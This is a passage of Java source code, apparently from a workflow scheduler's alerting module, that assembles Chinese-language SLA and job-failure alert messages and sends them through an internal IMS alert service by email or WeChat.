if(imsAlerterWays.contains(\"3\")){      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 FinishSla \u5fae\u4fe1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = createRTXFinishSlaMessage(slaOption, exflow);      handleSlaAlerter(slaOption, slaMessageWeChat, newTitle);    }  }  /**   * \u5904\u7406\u666e\u901a\u544a\u8b66\u53d1\u9001   * @param flow   * @param emails   * @param alertLevel   */  private void doAlertByWeBank(ExecutableFlow flow, List<String> emails, AlertLevel alertLevel){//    if(this.alerterWay.contains(\"1\")){      //1 RTX\u6e20\u9053//      this.setAlerterWay(\"1\");//      logger.info(\"\u53d1\u9001 webank RTX\u544a\u8b66\");//      //\u7ec4\u88c5RTX\u683c\u5f0f\u4fe1\u606f//      String webankAlertRTX = createRTXAlertMessage(flow);////      handleWebankAlert(webankAlertRTX, emails, alertLevel);//    }    String newTitle = String.format(\"[%s:%s] %s\", flow.getProjectName(), flow.getFlowId(), this.title);    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")){      //2 \u90ae\u7bb1\u6e20\u9053      this.setAlerterWay(\"2\");      logger.info(\"\u53d1\u9001 webank \u90ae\u7bb1\u544a\u8b66\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String webankAlertEmail = createEmailAlertMessage(flow);      handleWebankAlert(webankAlertEmail, emails, alertLevel, newTitle);    }    if(imsAlerterWays.contains(\"3\")){      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      logger.info(\"\u53d1\u9001 webank \u5fae\u4fe1\u544a\u8b66\");      //\u7ec4\u88c5\u5fae\u4fe1\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = createRTXAlertMessage(flow);      handleWebankAlert(slaMessageWeChat, emails, alertLevel, newTitle);    }  }  /**   * \u666e\u901a\u544a\u8b66\u7684 IMS \u63a5\u53e3\u8c03\u7528\u65b9\u6cd5   * @param webankAlertMessage   * @param emails   * @param alertLevel   */  private void handleWebankAlert(String webankAlertMessage, List<String> emails, AlertLevel alertLevel, String newTitle){    logger.info(\" -->1. doAlertByWeBank(ExecutableFlow flow) method is start executing\");    logger.info(\"\u5f00\u59cb\u53d1\u9001IMS\u544a\u8b66\u3002\");    IMSAlert imsAlert = new IMSAlert(this.alarmServer,        this.alarmPort,        Integer.parseInt(this.alarmSubSystemID),        newTitle,        logger);    logger.info(\" --> 2. new IMSAlerter instance is success : \" + imsAlert);    //\u544a\u8b66\u4fe1\u606f    imsAlert.setAlertInfo(webankAlertMessage);    //\u544a\u8b66\u65b9\u5f0f    String[] strArr = this.alerterWay.split(\",\") ;    for(int i=0 ; i < strArr.length ; i++){      if(strArr[i].matches(\"\\\\d\")){        imsAlert.addAlertWay(Integer.parseInt(strArr[i]));      }    }    logger.info(\"--> 3.process alerterWay is successed\");    //\u544a\u8b66\u7ea7\u522b    imsAlert.setAlertLevel(alertLevel);    //toEcc    imsAlert.setToECC(Integer.valueOf(this.toEcc));    //\u901a\u77e5\u5bf9\u8c61 adminstrators    List<String> alerter = new ArrayList<>();    String[] alerterArr = this.alerterReciver.split(\",\");    for(int i=0 ; i < alerterArr.length ; i++){      alerter.add(alerterArr[i]);    }    //\u6dfb\u52a0\u6307\u5b9a\u544a\u8b66\u4eba    for(String str : emails){      String temp = str.split(\"@\")[0];      alerter.add(temp);      logger.info(\"\u6dfb\u52a0\u6307\u5b9a\u544a\u8b66\u4eba: \" + temp);    }    logger.info(\"--> 4.process alerterReciver is successed\");    imsAlert.setAlertReceivers(alerter);    IMSAlert.Result rs = null ;    try {      rs = imsAlert.alert();      logger.info(\"\u8c03IMS\u63a5\u53e3\u8fd4\u56de\u7ed3\u679c: \" + rs.toString());    } catch (IOException e) {      logger.error(\"\u8c03IMS\u63a5\u53e3\u51fa\u9519: \",e);    }  }  /**   * \u666e\u901a\u544a\u8b66RTX\u6a21\u677f   * @param flow   * @return   */  private String createRTXAlertMessage(ExecutableFlow flow){    //\u83b7\u53d6\u9009\u9879\u8bbe\u7f6e    ExecutionOptions option = flow.getExecutionOptions();    StringBuffer stringBuffer = new StringBuffer();    String dep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"WTSS\" : flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<ExecutableNode> executableNodes = new ArrayList<>();    FlowUtils.getAllFailedNodeList(flow, executableNodes);    List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);    failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);    List<String> emails = null;    if(flow.getStatus().equals(Status.SUCCEEDED)){      emails = flow.getExecutionOptions().getSuccessEmails();    } else {      emails = flow.getExecutionOptions().getFailureEmails();    }    List<String> contacts = emails.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    stringBuffer.append(\"\\n\");    stringBuffer.append(\"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\");    //stringBuffer.append(flow.getOtherOption().get(\"alertUserDeparment\"));    stringBuffer.append( \"WTSS\u7cfb\u7edf\u6d88\u606f\uff0c\u8be6\u60c5\u5982\u4e0b\uff1a\");    stringBuffer.append(\"  \\n\u9879\u76eeID: \");    stringBuffer.append(flow.getProjectId());    stringBuffer.append(\";  \\n\u9879\u76ee\u540d\u79f0: \");    stringBuffer.append(flow.getProjectName());    stringBuffer.append(\";  \\n\u5de5\u4f5c\u6d41\u540d\u79f0: \");    stringBuffer.append(flow.getFlowId());    stringBuffer.append(\";  \\n\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \");    stringBuffer.append(failedNodeNestId.toString());    stringBuffer.append(\";  \\n\u6267\u884cID: \");    stringBuffer.append(flow.getExecutionId());    stringBuffer.append(\";  \\n\u63d0\u4ea4\u4eba: \") ;    stringBuffer.append(flow.getSubmitUser());    stringBuffer.append(\";  \\n\u63d0\u4ea4\u65f6\u95f4: \") ;    stringBuffer.append(fmt.print(new DateTime(flow.getSubmitTime())));    stringBuffer.append(\";  \\n\u4ee3\u7406\u7528\u6237: \") ;    stringBuffer.append(flow.getProxyUsers());    stringBuffer.append(\";  \\n\u5f00\u59cb\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getStartTime())));    String endTime = fmt.print(new DateTime(flow.getEndTime()));    if(flow.getStatus() == Status.FAILED_FINISHING){      endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f.\";    }    stringBuffer.append(\";  \\n\u7ed3\u675f\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(endTime);    stringBuffer.append(\";  \\n\u8017\u65f6: \");    stringBuffer.append(Utils.formatDuration(flow.getStartTime(), flow.getEndTime()));    stringBuffer.append(\";  \\n\u72b6\u6001: \");    stringBuffer.append(flow.getStatus());    if(flow.getExecutionOptions().getDisabledJobs().size()>0) {      stringBuffer.append(\"\\ndisabled job(\");      List<Object> disableJobs = flow.getExecutionOptions().getDisabledJobs();      for (Object djob : disableJobs) {        stringBuffer.append(\"; \\n\" + djob + \"\u3001\");      }      stringBuffer.append(\"\\n)\");    }    return stringBuffer.toString();  }  /**   * \u666e\u901a\u544a\u8b66Email\u6a21\u677f   * @param flow   * @return   */  private String createEmailAlertMessage(ExecutableFlow flow){    //\u83b7\u53d6\u9009\u9879\u8bbe\u7f6e    ExecutionOptions option = flow.getExecutionOptions();    StringBuffer stringBuffer = new StringBuffer();    String dep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"WTSS\" : flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<ExecutableNode> executableNodes = new ArrayList<>();    FlowUtils.getAllFailedNodeList(flow, executableNodes);    List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);    failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);    List<String> emails = null;    if(flow.getStatus().equals(Status.SUCCEEDED)){      emails = flow.getExecutionOptions().getSuccessEmails();    } else {      emails = flow.getExecutionOptions().getFailureEmails();    }    List<String> contacts = emails.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    stringBuffer.append(\"</br>\");    stringBuffer.append(\"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\");    stringBuffer.append(\"WTSS\u7cfb\u7edf\u6d88\u606f\uff0c\u8be6\u60c5\u5982\u4e0b\uff1a\");    stringBuffer.append(\"  </br>\u9879\u76eeID: \");    stringBuffer.append(flow.getProjectId());    stringBuffer.append(\";  </br>\u9879\u76ee\u540d\u79f0: \");    stringBuffer.append(flow.getProjectName());    stringBuffer.append(\";  </br>\u5de5\u4f5c\u6d41\u540d\u79f0: \");    stringBuffer.append(flow.getFlowId());    stringBuffer.append(\"; </br>\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \");    stringBuffer.append(failedNodeNestId.toString());    stringBuffer.append(\";  </br>\u6267\u884cID: \");    stringBuffer.append(flow.getExecutionId());    stringBuffer.append(\";  </br>\u63d0\u4ea4\u4eba: \") ;    stringBuffer.append(flow.getSubmitUser());    stringBuffer.append(\";  </br>\u63d0\u4ea4\u65f6\u95f4: \") ;    stringBuffer.append(fmt.print(new DateTime(flow.getSubmitTime())));    stringBuffer.append(\";  </br>\u4ee3\u7406\u7528\u6237: \") ;    stringBuffer.append(flow.getProxyUsers());    stringBuffer.append(\";  </br>\u5f00\u59cb\u6267\u884c\u65f6\u95f4: \");    String endTime = fmt.print(new DateTime(flow.getStartTime()));    if(flow.getStatus() == Status.FAILED_FINISHING){      endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f.\";    }    stringBuffer.append(endTime);    stringBuffer.append(\";  </br>\u7ed3\u675f\u6267\u884c\u65f6\u95f4: \");    stringBuffer.append(fmt.print(new DateTime(flow.getEndTime())));    stringBuffer.append(\";  </br>\u8017\u65f6: \");    stringBuffer.append(Utils.formatDuration(flow.getStartTime(), flow.getEndTime()));    stringBuffer.append(\";  </br>\u72b6\u6001: \");    stringBuffer.append(flow.getStatus());    if(flow.getExecutionOptions().getDisabledJobs().size()>0) {      stringBuffer.append(\"</br>disabled job(\");      List<Object> disableJobs = flow.getExecutionOptions().getDisabledJobs();      for (Object djob : disableJobs) {        stringBuffer.append(\"; </br>\" + djob + \"\u3001\");      }      stringBuffer.append(\"</br>)\");    }    return stringBuffer.toString();  }  private void doSlaAlerter(SlaOption slaOption, String slaMessage){    //\u53d1\u9001\u6d88\u606f\u6e20\u9053    //1 RTX\u6e20\u9053//    this.setAlerterWay(\"1\");//    //\u7ec4\u88c5RTX\u683c\u5f0f\u4fe1\u606f//    String slaMessageRTX = replaceSlaMessageRTX(slaMessage);////    handleSlaAlerter(slaOption, slaMessageRTX);    //2 \u90ae\u7bb1\u6e20\u9053    final String imsAlerterWays = this.props.getString(\"alarm.alerterWay\");    if(imsAlerterWays.contains(\"2\")) {      this.setAlerterWay(\"2\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageEmail = replaceSlaMessageEmail(slaMessage);//      handleSlaAlerter(slaOption, slaMessageEmail);    }    if(imsAlerterWays.contains(\"3\")) {      //3 \u5fae\u4fe1\u6e20\u9053      this.setAlerterWay(\"3\");      //\u7ec4\u88c5Email\u683c\u5f0f\u4fe1\u606f      String slaMessageWeChat = replaceSlaMessageRTX(slaMessage);//      handleSlaAlerter(slaOption, slaMessageWeChat);    }  }  /**   * \u8bbe\u7f6e\u544a\u8b66\u53d1\u9001\u6e20\u9053   */  public void setAlerterWay(String alerterWay) {    this.alerterWay = alerterWay;  }  /**   * flow\u5931\u8d25\u6682\u505c\u544a\u8b66   * @param slaMessage   */  private void handleFlowPausedAlerter(ExecutableFlow flow, String slaMessage, String newTitle){    ExecutionOptions executionOptions = flow.getExecutionOptions();    List<String> emailList = executionOptions.getFailureEmails();    final List<String> rtxListAlerter = new ArrayList<>() ;    for(String str:emailList){      logger.info(\"doSlaAlerter is -->\"+str.split(\"@\")[0]);      rtxListAlerter.add(str.split(\"@\")[0]);    }    //to ims    IMSAlert imsAlert = new IMSAlert(this.alarmServer,this.alarmPort, Integer.parseInt(this.alarmSubSystemID), newTitle,logger);    logger.info(\"--> 2. doSlaAlerter new IMSAlerter instance is success : \" + imsAlert);    //\u544a\u8b66\u4fe1\u606f    imsAlert.setAlertInfo(slaMessage);    //\u544a\u8b66\u65b9\u5f0f    String[] strArr  = this.alerterWay.split(\",\");    for(int i=0 ; i < strArr.length ; i++){      if(strArr[i].matches(\"\\\\d\")){        imsAlert.addAlertWay(Integer.parseInt(strArr[i]));        logger.info(\"--> alerterWay is \"+strArr[i]);      }    }    logger.info(\"--> 3.process alerterWay is successed\");    String failureAlertLevel;    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    if(null == flow.getOtherOption().get(\"failureAlertLevel\") || \"\".equals(flow.getOtherOption().get(\"failureAlertLevel\"))){      failureAlertLevel = \"MAJOR\";    } else {      failureAlertLevel = flow.getOtherOption().get(\"failureAlertLevel\") + \"\";    }    //\u544a\u8b66\u7ea7\u522b    imsAlert.setAlertLevel(AlertLevel.valueOf(failureAlertLevel));    //toEcc    imsAlert.setToECC(Integer.valueOf(this.toEcc));    logger.info(\"--> 4.process alerterReciver is successed\");    imsAlert.setAlertReceivers(rtxListAlerter);    IMSAlert.Result rs = null ;    try {      rs = imsAlert.alert();      logger.info(\"--> 5. imsAlert.alert() is successed. all step is successed !\" );    } catch (IOException e) {      logger.error(\"\u8c03IMS\u63a5\u53e3\u51fa\u9519\uff1a\",e);    }    logger.info(\"\u8c03IMS\u63a5\u53e3\u8fd4\u56de\u7ed3\u679c\uff1a\" + rs.toString());  }  /**   * SLA\u544a\u8b66\u53d1\u9001\u6d41\u7a0b\u5904\u7406   * @param slaOption   * @param slaMessage   */  private void handleSlaAlerter(SlaOption slaOption,String slaMessage, String newTitle){    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    final List<String> rtxListAlerter = new ArrayList<>() ;    for(String str:emailList){      logger.info(\"doSlaAlerter is -->\"+str.split(\"@\")[0]);      rtxListAlerter.add(str.split(\"@\")[0]);    }    //to ims    IMSAlert imsAlert = new IMSAlert(this.alarmServer,this.alarmPort, Integer.parseInt(this.alarmSubSystemID), newTitle,logger);    logger.info(\"--> 2. doSlaAlerter new IMSAlerter instance is success : \" + imsAlert);    //\u544a\u8b66\u4fe1\u606f    imsAlert.setAlertInfo(slaMessage);    //\u544a\u8b66\u65b9\u5f0f    String[] strArr  = this.alerterWay.split(\",\");    for(int i=0 ; i < strArr.length ; i++){      if(strArr[i].matches(\"\\\\d\")){        imsAlert.addAlertWay(Integer.parseInt(strArr[i]));        logger.info(\"--> alerterWay is \"+strArr[i]);      }    }    logger.info(\"--> 3.process alerterWay is successed\");    //\u544a\u8b66\u7ea7\u522b    //imsAlert.setAlertLevel(AlertLevel.WARNING);    try {      if(null == slaOption.getLevel() || \"\".equals(slaOption.getLevel())){        imsAlert.setAlertLevel(AlertLevel.MAJOR);      }else{        imsAlert.setAlertLevel(AlertLevel.valueOf(slaOption.getLevel()));      }    } catch (Exception e) {      logger.info(\"\u544a\u8b66\u7ea7\u522b\u83b7\u53d6\u5f02\u5e38\uff0c\u9ed8\u8ba4\u4f7f\u7528MAJOR\u7ea7\u522b\u544a\u8b66\uff01\");      imsAlert.setAlertLevel(AlertLevel.MAJOR);    }    //toEcc    imsAlert.setToECC(Integer.valueOf(this.toEcc));    logger.info(\"--> 4.process alerterReciver is successed\");    imsAlert.setAlertReceivers(rtxListAlerter);    IMSAlert.Result rs = null ;    try {      rs = imsAlert.alert();      logger.info(\"--> 5. imsAlert.alert() is successed. all step is successed !\" );    } catch (IOException e) {      logger.error(\"\u8c03IMS\u63a5\u53e3\u51fa\u9519\uff1a\",e);    }    logger.info(\"\u8c03IMS\u63a5\u53e3\u8fd4\u56de\u7ed3\u679c\uff1a\" + rs.toString());  }  /**   * \u66ff\u6362SLA\u544a\u8b66\u4fe1\u606f\u4e3aRTX\u683c\u5f0f   * @param slaMessage   * @return   */  private String replaceSlaMessageRTX(String slaMessage){    String rtx = slaMessage.replaceAll(\"#br\",\"\\n\");    return rtx;  }  /**   * \u66ff\u6362SLA\u544a\u8b66\u4fe1\u606f\u4e3aEmail\u683c\u5f0f   * @param slaMessage   * @return   */  private String replaceSlaMessageEmail(String slaMessage){    String email = slaMessage.replaceAll(\"#br\",\"</br>\");    return email;  }  /**   * SLA\u4efb\u52a1\u6267\u884c\u7ed3\u679c\u544a\u8b66\u4fe1\u606f\u521b\u5efa   * @param slaOption   * @param flow   * @return   */  public static String createRTXFinishSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_SUCCESS_EMAILS)) {//Flow \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Flow\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_FLOW_FAILURE_EMAILS)) {//Flow \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Flow\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_FLOW_FINISH_EMAILS)) {//Flow \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Flow\",\"FINISH\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCESS_EMAILS)) {//Job \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Job\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_JOB_FAILURE_EMAILS)) {//Job \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Job\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_JOB_FINISH_EMAILS)) {//Job \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildRTXFinishSlaMessageText(flow, slaOption, \"Job\",\"FINISH\");    } else {      return \"Unrecognized SLA type \" + type;    }  }  /**   * RTX SLA\u544a\u8b66\u4fe1\u606f\u6a21\u677f   * @param flow       \u6267\u884c\u7684flow   * @param slaOption  SLA\u914d\u7f6e   * @param taskType   \u4efb\u52a1\u7c7b\u578b   * @param runStatus  \u8fd0\u884c\u72b6\u6001   * @return   */  private static String buildRTXFinishSlaMessageText(ExecutableFlow flow, SlaOption slaOption, String taskType, String runStatus){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    runStatus = \"Finish\".equals(runStatus) ? \"Finish\":runStatus;    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    if(\"Flow\".equals(taskType)){      final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \" ! \\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      String endTime = fmt.print(new DateTime(flow.getEndTime()));      if(flow.getStatus() == Status.FAILED_FINISHING){        endTime = \"\u5de5\u4f5c\u6d41\u6b63\u5728\u8fd0\u884c\u4e2d\uff0c\u8fd8\u672a\u7ed3\u675f\";      }      List<ExecutableNode> executableNodes = new ArrayList<>();      FlowUtils.getAllFailedNodeList(flow, executableNodes);      List<String> failedNodeNestId = FlowUtils.getAllFailedNodeNestIdSortByEndTime(executableNodes);      failedNodeNestId = FlowUtils.getThreeFailedNodeNestId(failedNodeNestId);      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \\n\"              + \"\u5de5\u4f5c\u6d41: \" + flowName + \"\\n\"              + \"\u6267\u884c\u5931\u8d25\u7684\u4efb\u52a1: \" + failedNodeNestId.toString() + \"\\n\"              + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".\\n\"              + \"\u5de5\u4f5c\u6d41\u7ed3\u675f\u65f6\u95f4: \" + endTime + \".\\n\"              + \"\u5de5\u4f5c\u6d41\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(flow.getStartTime(), flow.getEndTime()) + \".\\n\";      slaText = basicInfo + expected;    } else {      final String jobName = (String) slaOption.getInfo().get(SlaOption.INFO_JOB_NAME);      ExecutableNode job = flow.getExecutableNode(jobName);      if(job == null){        job = flow.getExecutableNodePath(jobName);      }      // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f      String informInfo;      String basicInfo;      if (\"true\".equals(depTypeInform)) {        informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";      }else {        informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";      }      basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u4efb\u52a1(Job) \" + jobName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + runStatus + \"! \\n\" + informInfo          + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"\\n\";      final String expected =          \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \\n\"              + \"\u4efb\u52a1\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + \"\\n\"              + \"\u4efb\u52a1\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(job.getStartTime())) + \".\\n\"              + \"\u4efb\u52a1\u7ed3\u675f\u65f6\u95f4: \" + fmt.print(new DateTime(job.getEndTime())) + \".\\n\"              + \"\u4efb\u52a1\u6267\u884c\u8017\u65f6: \" + Utils.formatDuration(job.getStartTime(), job.getEndTime()) + \".\\n\"              + \"\u4efb\u52a1\u5c5e\u4e8e\u5de5\u4f5c\u6d41: \" + flow.getId() + \".\\n\";      slaText = basicInfo + expected;    }    return slaText;  }  /**   * Email SLA\u4efb\u52a1\u6267\u884c\u7ed3\u679c\u544a\u8b66\u4fe1\u606f\u521b\u5efa   * @param slaOption   * @param flow   * @return   */  public static String createEmailFinishSlaMessage(final SlaOption slaOption, final ExecutableFlow flow) {    final String type = slaOption.getType();    if (type.equals(SlaOption.TYPE_FLOW_SUCCESS_EMAILS)) {//Flow \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Flow\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_FLOW_FAILURE_EMAILS)) {//Flow \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Flow\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_FLOW_FINISH_EMAILS)) {//Flow \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Flow\",\"FINISH\");    } else if (type.equals(SlaOption.TYPE_JOB_SUCCESS_EMAILS)) {//Job \u6267\u884c\u6210\u529f \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Job\",\"SUCCESS\");    } else if (type.equals(SlaOption.TYPE_JOB_FAILURE_EMAILS)) {//Job \u6267\u884c\u5931\u8d25 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Job\",\"FAILURE\");    }  else if (type.equals(SlaOption.TYPE_JOB_FINISH_EMAILS)) {//Job \u6267\u884c\u5b8c\u6210 \u544a\u8b66\u4fe1\u606f\u7ec4\u88c5      return buildEmailFinishSlaMessageText(flow, slaOption, \"Job\",\"FINISH\");    } else {      return \"Unrecognized SLA type \" + type;    }  }  private static String buildFlowPausedMessage(ExecutableFlow flow, String nodePath, String split){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    ExecutionOptions executionOptions = flow.getExecutionOptions();    List<String> emailList = executionOptions.getFailureEmails();    //\u5386\u53f2\u7248\u672c\u517c\u5bb9    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    final String flowName = flow.getId();    final String basicInfo =            \"\u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + flow.getStatus() + \" ! \" + split                    + \"\u8bf7\u7acb\u5373\u8054\u7cfb \" + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + split;    final String expected =            \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \" + split                    + \"\u5de5\u4f5c\u6d41: \" + flowName + split                    + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + split                    + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".\" + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u6682\u505c\u65f6\u95f4: \" + fmt.print(flow.getUpdateTime()) + \".\" + split                    + \"\u5907\u6ce8: job(\" + nodePath + \")\u8fd0\u884c\u5931\u8d25\u5de5\u4f5c\u6d41\u5df2\u6682\u505c\u8fd0\u884c.\" + split;    slaText = basicInfo + expected;    return slaText;  }  private static String buildFlowPausedMessage(SlaOption slaOption, ExecutableFlow flow, String nodePath, String split){    final int execId = flow.getExecutionId();    String slaText = \"Finish Sla Message Bulid\";    List<String> emailList = (List<String>) slaOption.getInfo().get(SlaOption.INFO_EMAIL_LIST);    List<String> contacts = emailList.stream().map(x -> x.contains(\"@\") ? x.split(\"@\")[0] : x).collect(Collectors.toList());    final String flowName = (String) slaOption.getInfo().get(SlaOption.INFO_FLOW_NAME);    String depTypeInform = (String) slaOption.getInfo().get(SlaOption.INFO_DEP_TYPE_INFORM);    final String userDep = flow.getOtherOption().get(\"alertUserDeparment\") == null        ? \"\":flow.getOtherOption().get(\"alertUserDeparment\") + \"\";    // \u6309\u7167\u90e8\u95e8\u901a\u77e5\u7684\u63d0\u793a\u4fe1\u606f    String informInfo;    String basicInfo;    if (\"true\".equals(depTypeInform)) {      informInfo = \"\u8bf7\u8054\u7cfb[\"+ userDep +\"]\u90e8\u95e8WTSS\u6279\u91cf\u503c\u73ed\u540c\u5b66, \u6216\u8005\";    }else {      informInfo = \"\u8bf7\u7acb\u5373\u8054\u7cfb: \";    }    basicInfo = \"SLA \u544a\u8b66: \u4f60\u7684\u5de5\u4f5c\u6d41(Flow) \" + flowName + \" \u7684\u6267\u884c\u72b6\u6001\u4e3a \" + flow.getStatus() + \" ! \" + split + informInfo        + contacts.toString() + \" \u6216\u8005 \u63d0\u4ea4\u4eba \" + flow.getSubmitUser() + \"</br>\"  + split;    final String expected =            \"\u8be6\u7ec6\u4fe1\u606f\u5982\u4e0b: \" + split                    + \"\u5de5\u4f5c\u6d41: \" + flowName + split                    + \"\u8fd0\u884c\u7f16\u53f7: \" + execId + split                    + \"\u5de5\u4f5c\u6d41\u63d0\u4ea4\u4eba: \" + flow.getSubmitUser() + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u65f6\u95f4: \" + fmt.print(new DateTime(flowStartTimeChecker(flow))) + \".\" + split                    + \"\u5de5\u4f5c\u6d41\u5f00\u59cb\u6682\u505c\u65f6\u95f4: \" + fmt.print(flow.getUpdateTime()) + \".\" + split                    + \"\u5907\u6ce8: job(\" + nodePath + 